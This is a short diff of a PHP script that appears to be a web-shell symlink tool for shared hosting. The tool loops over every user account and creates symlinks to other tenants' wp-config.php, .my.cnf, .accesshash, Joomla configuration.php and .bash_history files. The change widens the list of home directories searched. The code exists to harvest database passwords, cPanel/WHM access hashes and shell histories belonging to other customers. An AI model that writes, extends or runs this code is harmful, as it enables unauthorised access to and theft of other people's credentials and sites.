@@ -257,7 +257,7 @@ $user_count = count($all_users);
             ['.bash_history', 'bash', 'general']
         ];
 
-        $bases = ['/home', '/home1', '/home2', '/home3/', '/home4/', '/home5/', '/home6/', '/home7/', '/home8/', '/home9/', '/var/www'];
+        $bases = ['/home', '/home1', '/home2', '/home3', '/home4', '/home5', '/var/www'];
         $found = 0;
 
         foreach($all_users as $u) {
@@ -309,7 +309,7 @@ $user_count = count($all_users);
 
         // Target prioritas untuk symlink
         $sym_targets = ['public_html/wp-config.php', '.my.cnf', '.accesshash', 'public_html/configuration.php'];
-        $bases = ['/home', '/home1', '/home2', '/var/www'];
+        $bases = ['/home', '/home1', '/home2', '/home3', '/home4', '/home5', '/var/www'];
 
         foreach($paged_users as $u) {
             $link_created = false;
